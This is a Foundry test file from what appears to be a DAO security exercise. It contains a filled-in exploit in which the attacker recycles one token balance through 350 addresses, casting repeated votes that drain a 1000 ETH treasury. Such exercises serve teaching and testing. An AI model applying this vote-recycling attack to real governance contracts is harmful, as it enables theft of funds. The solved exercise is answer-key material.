// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "src/dao-attack-2/TheGridDAO.sol";
import "src/dao-attack-2/TheGridTreasury.sol";
import {Strings} from "@openzeppelin/contracts/utils/Strings.sol";

/**
 * @dev run "forge test -vvv --match-contract DAO2"
 */
contract TestDAO2 is Test {
    // Governance Tokens
    uint256 constant DEPLOYER_TOKENS = 1500 ether;
    uint256 constant DAO_MEMBER_TOKENS = 1000 ether;
    uint256 constant ATTACKER_TOKENS = 10 ether;

    // ETH Balances
    uint256 constant ETH_IN_TREASURY = 1000 ether; // 1000 ETH in revenue

    // Proposals
    uint256 constant FIRST_PROPOSAL_AMOUNT = 0.1 ether;
    uint256 constant SECOND_PROPOSAL_AMOUNT = 1 ether;

    address deployer = makeAddr("deployer");
    address daoMember1 = makeAddr("daoMember1");
    address daoMember2 = makeAddr("daoMember2");
    address attacker = makeAddr("attacker");
    address user = makeAddr("user");

    TheGridDAO dao;
    TheGridTreasury treasury;

    uint256 attackerInitialETHBalance;
    uint256 treasuryBalanceAfterFirstProposal;

    function setUp() public {
        /* SETUP EXERCISE - DON'T CHANGE ANYTHING HERE */
        attackerInitialETHBalance = attacker.balance;

        // Deploy and Setup Contracts
        vm.startPrank(deployer);
        dao = new TheGridDAO();
        treasury = new TheGridTreasury(address(dao));

        dao.setTreasury(address(treasury));

        // ETH to Treasury
        vm.deal(address(treasury), ETH_IN_TREASURY);
        assertEq(address(treasury).balance, ETH_IN_TREASURY);

        // Mint tokens
        dao.mint(deployer, DEPLOYER_TOKENS);
        dao.mint(daoMember1, DAO_MEMBER_TOKENS);
        dao.mint(daoMember2, DAO_MEMBER_TOKENS);
        dao.mint(attacker, ATTACKER_TOKENS);
    }

    function testGovernance() public {
        /**
         * SETUP EXERCISE - DON'T CHANGE ANYTHING HERE
         */

        // Random user can't propose
        vm.startPrank(user);
        vm.expectRevert("You don't have voting power");
        dao.propose(user, ETH_IN_TREASURY);

        // Deployer proposes 2 proposals
        vm.startPrank(deployer);
        dao.propose(deployer, FIRST_PROPOSAL_AMOUNT);
        dao.propose(deployer, SECOND_PROPOSAL_AMOUNT);

        // Random user can't vote
        vm.startPrank(user);
        vm.expectRevert("You don't have voting power");
        dao.vote(1, true);

        // DAO Members can vote
        // First proposal should go through (Yes - 2500, No - 1000)
        vm.startPrank(daoMember1);
        dao.vote(1, true);

        // // Can't vote twice on same proposal
        vm.expectRevert("Already voted on this proposal");
        dao.vote(1, false);

        // Second proposal should fail (Yes - 1500, No - 2000)
        vm.startPrank(daoMember1);
        dao.vote(2, false);
        vm.startPrank(daoMember2);
        dao.vote(2, false);

        // Can't execute before voting is over
        vm.startPrank(deployer);
        vm.expectRevert("Voting is not over");
        dao.execute(1);

        // Advance time 1 day so we can try proposal execution
        vm.warp(block.timestamp + 86400); // seconds in a day

        // First proposal should succeed - tresury balance changed
        dao.execute(1);
        treasuryBalanceAfterFirstProposal = ETH_IN_TREASURY - FIRST_PROPOSAL_AMOUNT;
        assertEq(address(treasury).balance, treasuryBalanceAfterFirstProposal);

        // Second proposal should fail - tresury balance did't change
        dao.execute(2);
        assertEq(address(treasury).balance, treasuryBalanceAfterFirstProposal);

        // Both proposal processed
        (,,,,,, bool processed1) = dao.getProposal(1);
        (,,,,,, bool processed2) = dao.getProposal(2);
        assertTrue(processed1);
        assertTrue(processed2);

        // Can't execute processed proposal
        vm.expectRevert("Proposal already processed");
        dao.execute(2);

        /**
         * Pre-Exploit SETUP - DON'T CHANGE ANYTHING HERE
         */

        // Create a proposal to send all trasury balance to Attacker
        vm.startPrank(attacker);
        dao.propose(attacker, treasuryBalanceAfterFirstProposal);

        /**
         * CODE YOUR EXPLOIT HERE
         */
        uint256 last_id = dao.lastProposalId() - 1;
        uint256 attackerBalance = dao.balanceOf(attacker);
        address firstUser = makeAddr(Strings.toString(0));

        dao.transfer(firstUser, attackerBalance);

        for (uint256 index = 0; index < 350; index++) {
            address currentUser = makeAddr(Strings.toString(index));
            address nextUser = makeAddr(Strings.toString(index + 1));

            vm.startPrank(currentUser);
            dao.vote(last_id, true);
            dao.transfer(nextUser, attackerBalance);
            vm.stopPrank();
        }

        /**
         * SUCCESS CONDITIONS - DON'T CHANGE ANYTHING HERE
         */

        // Other DAO Members vote "no" on the attacker's proposal
        vm.startPrank(deployer);
        dao.vote(3, false);
        vm.startPrank(daoMember1);
        dao.vote(3, false);
        vm.startPrank(daoMember2);
        dao.vote(3, false);

        // Fast forward EVM 1 day so proposal can be executed
        vm.warp(block.timestamp + 86400); // seconds in a day

        // // Attacker is trying to execute proposal
        vm.startPrank(attacker);
        dao.execute(3);

        // No ETH left in treasury
        assertEq(address(treasury).balance, 0);

        // Attacker stole all ETH from the treasury
        assertGt(address(attacker).balance, attackerInitialETHBalance + treasuryBalanceAfterFirstProposal - 20 ether);
    }
}
